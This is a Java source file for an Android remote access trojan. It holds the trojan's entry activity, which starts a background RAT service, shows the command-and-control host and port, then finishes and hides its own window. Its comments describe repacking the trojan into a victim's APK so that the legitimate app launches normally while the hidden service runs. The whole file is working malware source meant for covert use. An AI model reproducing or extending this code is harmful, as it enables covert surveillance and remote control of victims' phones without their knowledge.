package com.darkbiit.rat;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.view.Gravity;
import android.view.View;
import android.widget.TextView;

/**
 * Entry activity of the RAT.
 *
 * It starts the service and shows a short status line, then finishes itself.
 * In the repacked victim APK this activity is NOT declared in the manifest,
 * so the victim app is launched normally; the service is started by the
 * merged manifest's receiver/service declarations instead.
 */
public class RatMainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
            Intent svc = new Intent(this, RatService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(svc);
            } else {
                startService(svc);
            }
        } catch (Throwable t) {
            RatLog.w("service start failed: " + t.getMessage());
        }

        TextView tv = new TextView(this);
        tv.setText("RAT active\n" + RatCfg.C2_HOST + ":" + RatCfg.C2_PORT);
        tv.setGravity(Gravity.CENTER);
        tv.setPadding(32, 32, 32, 32);
        setContentView(tv);
    }

    @Override
    protected void onResume() {
        super.onResume();
        // Do not stay in the foreground; the service carries the work.
        finish();
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (hasFocus) {
            View decor = getWindow().getDecorView();
            decor.setVisibility(View.GONE);
        }
    }
}
